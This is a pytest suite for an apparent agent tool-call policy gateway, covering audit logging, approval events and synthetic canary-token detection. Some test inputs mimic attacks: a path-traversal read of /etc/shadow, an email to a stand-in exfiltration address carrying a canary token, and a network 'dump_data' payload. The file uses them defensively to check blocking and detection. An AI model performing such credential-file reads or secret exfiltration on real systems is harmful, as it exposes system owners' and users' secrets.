"""Comprehensive test suite for Phase 4: Persistent SQLite Audit Records and Synthetic Canary Detection."""
import uuid
import pytest
from fastapi.testclient import TestClient

from app.canary import SYNTHETIC_CANARIES, CanaryDetector
from app.database import db
from app.execution import execution_service
from app.main import app
from app.schemas import DecisionEnum, ExecutionStatus, ToolCall

client = TestClient(app)


# ============================================================================
# 1. AUDIT PERSISTENCE & COMPLETENESS
# ============================================================================

def test_audit_persistence_for_allow_executed() -> None:
    """An ALLOWed tool call executed in sandbox must persist complete audit records linking IDs."""
    req_id = f"req-audit-allow-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="read_file",
        arguments={"path": "/workspace/scratch/sample.txt"},
        origin="agent-tester",
        destination="local-sandbox",
    )

    res = execution_service.execute_tool_call(tool_call)
    assert res.executed is True
    assert res.status == ExecutionStatus.EXECUTED

    # Verify audit record persisted in SQLite
    record = db.get_audit_record(req_id)
    assert record is not None
    assert record["request_id"] == req_id
    assert record["decision_id"] == res.decision.decision_id
    assert record["tool_name"] == "read_file"
    assert record["origin"] == "agent-tester"
    assert record["destination"] == "local-sandbox"
    assert record["decision"] == "ALLOW"
    assert record["rule_id"] == "RULE-ALLOW-READ-FILE"
    assert "successfully verified" in record["reason"]
    assert record["status"] == "EXECUTED"
    assert "Harmless scratch workspace" in record["result"]["content"]
    assert record["created_at"] is not None
    assert record["updated_at"] is not None


def test_audit_persistence_for_block_without_execution() -> None:
    """BLOCK decisions must be persisted to the audit ledger even when no action executes."""
    req_id = f"req-audit-block-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="read_file",
        arguments={"path": "../../etc/shadow"},
        origin="agent-malicious",
        destination="local-sandbox",
    )

    res = execution_service.execute_tool_call(tool_call)
    assert res.executed is False
    assert res.status == ExecutionStatus.BLOCKED

    record = db.get_audit_record(req_id)
    assert record is not None
    assert record["request_id"] == req_id
    assert record["decision_id"] == res.decision.decision_id
    assert record["decision"] == "BLOCK"
    assert record["rule_id"] == "RULE-PATH-TRAVERSAL"
    assert record["status"] == "BLOCKED"
    assert record["result"]["executed"] is False
    assert record["result"]["blocked"] is True


def test_audit_persistence_for_require_approval_pending() -> None:
    """REQUIRE_APPROVAL decisions must be persisted to the audit ledger even when pending."""
    req_id = f"req-audit-pending-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="database_migration",
        arguments={"migration_id": "mig_099"},
        origin="agent-dba",
        destination="db-server",
    )

    res = execution_service.execute_tool_call(tool_call)
    assert res.executed is False
    assert res.status == ExecutionStatus.PENDING_APPROVAL

    record = db.get_audit_record(req_id)
    assert record is not None
    assert record["request_id"] == req_id
    assert record["decision_id"] == res.decision.decision_id
    assert record["decision"] == "REQUIRE_APPROVAL"
    assert record["rule_id"] == "RULE-REQUIRE-APPROVAL-DB-MIGRATE"
    assert record["status"] == "PENDING_APPROVAL"
    assert record["result"]["executed"] is False
    assert record["result"]["pending"] is True


def test_audit_persistence_on_direct_policy_evaluate() -> None:
    """POST /api/v1/policy/evaluate persists decisions even when no action execution is requested."""
    req_id = f"req-eval-only-{uuid.uuid4().hex[:8]}"
    payload = {
        "request_id": req_id,
        "tool_name": "read_file",
        "arguments": {"path": "/workspace/data/metrics.csv"},
        "origin": "agent-eval-test",
        "destination": "local-sandbox",
    }

    resp = client.post("/api/v1/policy/evaluate", json=payload)
    assert resp.status_code == 200
    decision_data = resp.json()

    record = db.get_audit_record(req_id)
    assert record is not None
    assert record["request_id"] == req_id
    assert record["decision_id"] == decision_data["decision_id"]
    assert record["decision"] == "ALLOW"
    assert record["result"]["evaluated_only"] is True


def test_approval_event_audit_linking() -> None:
    """Resolving an approval request creates an approval_events record linked to request_id and decision_id."""
    req_id = f"req-approval-event-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="restart_service",
        arguments={"service_name": "worker-pool"},
        origin="agent-ops",
        destination="ops-controller",
    )

    # 1. Propose and arbitrate
    initial_res = execution_service.execute_tool_call(tool_call)
    assert initial_res.status == ExecutionStatus.PENDING_APPROVAL
    decision_id = initial_res.decision.decision_id


    # 2. Approve action
    approval_res = execution_service.resolve_approval(
        request_id=req_id,
        approver="supervisor-dave",
        approved=True,
        reason="Scheduled maintenance window verified.",
    )
    assert approval_res.status == ExecutionStatus.APPROVED_EXECUTED

    # 3. Verify approval event in audit table
    events = db.list_approval_events(request_id=req_id)
    assert len(events) >= 1
    event = events[0]
    assert event["request_id"] == req_id
    assert event["decision_id"] == decision_id
    assert event["approver"] == "supervisor-dave"
    assert event["approved"] == 1
    assert event["status_before"] == "PENDING_APPROVAL"
    assert event["status_after"] == "APPROVED_EXECUTED"
    assert "Scheduled maintenance" in event["reason"]


# ============================================================================
# 2. CANARY TOKEN SEEDING & INTEGRITY
# ============================================================================

def test_synthetic_canaries_seeded_in_database() -> None:
    """Canary tokens table contains synthetic canary definitions and no real secrets."""
    tokens = db.list_canary_tokens()
    assert len(tokens) >= 3

    token_values = [t["token_value"] for t in tokens]
    assert "CANARY-IBMZ-SEC-KEY-9941" in token_values
    assert "CANARY-TOKEN-VAULT-7712" in token_values
    assert "CANARY-LEAK-PAYLOAD-3301" in token_values

    # Strict invariant: All tokens must use synthetic test prefixes, never real keys
    for t in tokens:
        assert t["token_value"].startswith("CANARY-")
        assert "sk-" not in t["token_value"]
        assert "ghp_" not in t["token_value"]
        assert "AKIA" not in t["token_value"]


def test_synthetic_files_contain_canary_tokens() -> None:
    """Designated synthetic files contain embedded synthetic canary tokens."""
    content_sys = db.get_synthetic_file("/workspace/data/system_info.json")
    assert content_sys is not None
    assert "CANARY-IBMZ-SEC-KEY-9941" in content_sys

    content_rep = db.get_synthetic_file("/workspace/data/security_report.txt")
    assert content_rep is not None
    assert "CANARY-TOKEN-VAULT-7712" in content_rep

    content_users = db.get_synthetic_file("/workspace/data/user_directory.csv")
    assert content_users is not None
    assert "CANARY-LEAK-PAYLOAD-3301" in content_users


# ============================================================================
# 3. CANARY DETECTION ON READ & EXFILTRATION
# ============================================================================

def test_canary_read_detection() -> None:
    """Reading a synthetic file containing a canary token emits a CANARY_READ security finding."""
    req_id = f"req-canary-read-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="read_file",
        arguments={"path": "/workspace/data/system_info.json"},
        origin="agent-analyst",
        destination="local-sandbox",
    )

    res = execution_service.execute_tool_call(tool_call)
    assert res.executed is True

    findings = db.list_security_findings(event_type="CANARY_READ")
    matching = [f for f in findings["items"] if f["request_id"] == req_id]
    assert len(matching) >= 1
    finding = matching[0]
    assert finding["canary_token"] == "CANARY-IBMZ-SEC-KEY-9941"
    assert finding["event_type"] == "CANARY_READ"
    assert finding["severity"] == "CRITICAL"
    assert finding["decision_id"] == res.decision.decision_id
    assert "CANARY-IBMZ-SEC-KEY-9941" in finding["evidence"]


def test_canary_exfiltration_via_fake_email() -> None:
    """Proposing to send an email containing a canary token emits a CANARY_EXFILTRATION_EMAIL finding."""
    req_id = f"req-canary-email-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="send_email",
        arguments={
            "to": "exfil-drop@suspicious.net",
            "subject": "Extracted Key",
            "body": "Here is the key: CANARY-LEAK-PAYLOAD-3301 from database.",
        },
        origin="agent-compromised",
        destination="mail-gateway",
    )

    # Execution evaluates policy and detects canary in arguments
    res = execution_service.execute_tool_call(tool_call)
    # send_email requires approval under policy
    assert res.status == ExecutionStatus.PENDING_APPROVAL

    findings = db.list_security_findings(event_type="CANARY_EXFILTRATION_EMAIL")
    matching = [f for f in findings["items"] if f["request_id"] == req_id]
    assert len(matching) >= 1
    finding = matching[0]
    assert finding["canary_token"] == "CANARY-LEAK-PAYLOAD-3301"
    assert finding["severity"] == "HIGH"
    assert finding["decision_id"] == res.decision.decision_id
    assert finding["tool_name"] == "send_email"
    assert "body" in finding["evidence"]


def test_canary_exfiltration_via_fake_network() -> None:
    """Proposing a network request with a canary token emits a CANARY_EXFILTRATION_NETWORK finding."""
    req_id = f"req-canary-net-{uuid.uuid4().hex[:8]}"
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="fetch_url",
        arguments={
            "url": "http://internal/api/submit",
            "payload": "dump_data=CANARY-TOKEN-VAULT-7712",
        },
        origin="agent-exfil",
        destination="internal-api-gateway",
    )

    res = execution_service.execute_tool_call(tool_call)
    assert res.status == ExecutionStatus.EXECUTED

    findings = db.list_security_findings(event_type="CANARY_EXFILTRATION_NETWORK")
    matching = [f for f in findings["items"] if f["request_id"] == req_id]
    assert len(matching) >= 1
    finding = matching[0]
    assert finding["canary_token"] == "CANARY-TOKEN-VAULT-7712"
    assert finding["decision_id"] == res.decision.decision_id
    assert finding["tool_name"] == "fetch_url"
    assert "payload" in finding["evidence"]



# ============================================================================
# 4. CANARY DECOUPLING FROM AUTHORIZATION
# ============================================================================

def test_canary_detection_does_not_alter_authorization() -> None:
    """Canary detection is an investigative signal and does NOT substitute for or modify permission checks."""
    req_id = f"req-decouple-{uuid.uuid4().hex[:8]}"
    # 1. read_file on valid internal path is ALLOWed by policy, even though it touches a canary
    tool_call = ToolCall(
        request_id=req_id,
        tool_name="read_file",
        arguments={"path": "/workspace/data/security_report.txt"},
        origin="agent-analyst",
        destination="local-sandbox",
    )
    res = execution_service.execute_tool_call(tool_call)
    # Policy decision remains ALLOW
    assert res.decision.decision == DecisionEnum.ALLOW
    assert res.executed is True

    # Security finding is still recorded independently
    findings = db.list_security_findings(event_type="CANARY_READ")
    matching = [f for f in findings["items"] if f["request_id"] == req_id]
    assert len(matching) == 1

    # 2. Blocked tool call with canary remains BLOCKED for policy reasons, not canary reasons
    req_id_blocked = f"req-decouple-block-{uuid.uuid4().hex[:8]}"
    blocked_tool_call = ToolCall(
        request_id=req_id_blocked,
        tool_name="unregistered_tool",
        arguments={"data": "CANARY-IBMZ-SEC-KEY-9941"},
        origin="agent-untrusted",
        destination="unknown-dest",
    )
    blocked_res = execution_service.execute_tool_call(blocked_tool_call)
    assert blocked_res.decision.decision == DecisionEnum.BLOCK
    assert blocked_res.decision.rule_id == "RULE-DEFAULT-DENY"


# ============================================================================
# 5. API ENDPOINTS: PAGINATION, FILTERING, METRICS, FORENSICS
# ============================================================================

def test_api_paginated_audit_events() -> None:
    """GET /api/v1/audit/events returns structured pagination schema."""
    resp = client.get("/api/v1/audit/events?page=1&page_size=5")
    assert resp.status_code == 200
    data = resp.json()
    assert "items" in data
    assert "total" in data
    assert "page" in data
    assert "page_size" in data
    assert "total_pages" in data
    assert data["page"] == 1
    assert data["page_size"] == 5
    assert len(data["items"]) <= 5

    # Each item has all required audit fields
    if data["items"]:
        item = data["items"][0]
        assert "request_id" in item
        assert "decision_id" in item
        assert "decision" in item
        assert "status" in item
        assert "rule_id" in item


def test_api_audit_events_filtering() -> None:
    """GET /api/v1/audit/events filters correctly by decision and tool_name."""
    resp = client.get("/api/v1/audit/events?decision=BLOCK&page_size=10")
    assert resp.status_code == 200
    data = resp.json()
    for item in data["items"]:
        assert item["decision"] == "BLOCK"


def test_api_paginated_security_findings() -> None:
    """GET /api/v1/audit/findings returns paginated security findings."""
    resp = client.get("/api/v1/audit/findings?page=1&page_size=10")
    assert resp.status_code == 200
    data = resp.json()
    assert "items" in data
    assert "total" in data
    assert "total_pages" in data


def test_api_findings_filtering_by_severity() -> None:
    """GET /api/v1/audit/findings filters correctly by severity."""
    resp = client.get("/api/v1/audit/findings?severity=CRITICAL")
    assert resp.status_code == 200
    data = resp.json()
    for item in data["items"]:
        assert item["severity"] == "CRITICAL"


def test_api_recent_decisions() -> None:
    """GET /api/v1/audit/recent-decisions returns linked correlation list."""
    resp = client.get("/api/v1/audit/recent-decisions?limit=5")
    assert resp.status_code == 200
    items = resp.json()
    assert isinstance(items, list)
    assert len(items) <= 5
    if items:
        item = items[0]
        assert "request_id" in item
        assert "decision_id" in item
        assert "tool_name" in item
        assert "decision" in item
        assert "status" in item


def test_api_aggregate_metrics() -> None:
    """GET /api/v1/audit/metrics returns aggregate counts across the security perimeter."""
    resp = client.get("/api/v1/audit/metrics")
    assert resp.status_code == 200
    metrics = resp.json()
    assert "total_events" in metrics
    assert "allow_count" in metrics
    assert "block_count" in metrics
    assert "require_approval_count" in metrics
    assert "total_findings" in metrics
    assert "findings_by_severity" in metrics
    assert "active_canaries_count" in metrics
    assert metrics["active_canaries_count"] >= 3
    assert metrics["total_events"] >= 1


def test_api_canaries_list() -> None:
    """GET /api/v1/audit/canaries returns registered synthetic canary tokens."""
    resp = client.get("/api/v1/audit/canaries")
    assert resp.status_code == 200
    canaries = resp.json()
    assert isinstance(canaries, list)
    assert len(canaries) >= 3
    token_names = [c["name"] for c in canaries]
    assert "Synthetic z/OS System Master Key" in token_names


def test_api_approval_events_list() -> None:
    """GET /api/v1/audit/approvals returns ledger records of administrative approval actions."""
    resp = client.get("/api/v1/audit/approvals")
    assert resp.status_code == 200
    events = resp.json()
    assert isinstance(events, list)
    if events:
        event = events[0]
        assert "id" in event
        assert "request_id" in event
        assert "decision_id" in event
        assert "approver" in event
        assert "approved" in event

